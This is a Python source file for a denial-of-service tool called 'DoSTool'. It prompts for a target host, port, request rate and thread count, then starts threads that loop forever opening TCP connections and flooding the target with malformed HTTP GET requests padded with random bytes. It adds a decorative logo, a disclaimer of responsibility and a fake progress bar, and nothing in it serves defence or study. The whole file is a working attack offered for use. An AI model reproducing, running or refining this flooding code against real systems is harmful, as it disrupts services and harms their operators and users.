#################### import ################
import socket
import time
import os
import random
from threading import Thread
from sys import platform
import requests


#################### clear ##################
if platform == "linux" or platform == "linux2":
    # linux
    os.system("clear")

elif platform == "win32":
    # Windows...
    os.system("cls")



if not __name__ == "__main__":
    exit()

#################### colors ##################
class ConsoleColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'

################### logo ##################
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
   ____       ____  _____           _ 
  |  _ \  ___/ ___||_   _|__   ___ | |
  | | | |/ _ \___ \  | |/ _ \ / _ \| |
  | |_| | (_) |__) | | | (_) | (_) | |
  |____/ \___/____/  |_|\___/ \___/|_|
  
  Auth: Mojito88
    Version: 1.0
    I decline any responsibility regarding 
    the use of this as of all other tools.
      ''')
print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + '''
 This packets sending is not protected from any proxy/vpn so your ip could be visible to the target
''')

#################### #script #################
def getport():
    try:
        port8 = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Specify Port:\r\n"))
        return port8
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host IP:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 0;

##################### class1 ###############
class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + ">----- PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + ">----- ")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?! Or protected by Cloudfare")
                        time.sleep(0.5)
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?! Or protected by Cloudfare")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    Dos Script is starting:...
   ''')

    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "INITIALIZATION >> [                    ] 0% ")
    time.sleep(0.8)
    print ("\033[A                                  \033[A")
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "INITIALIZATION >> [=====               ] 25%")
    time.sleep(0.8)
    print ("\033[A                                  \033[A")
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "INITIALIZATION >> [==========          ] 50%")
    time.sleep(0.8)
    print ("\033[A                                  \033[A")
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "INITIALIZATION >> [===============     ] 75%")
    time.sleep(0.8)
    print ("\033[A                                  \033[A")
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "INITIALIZATION >> [====================] 100%")

################### output #######################??

    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")


#Thanks if you are using my scipt <3
#And if you are modifying/editing it.
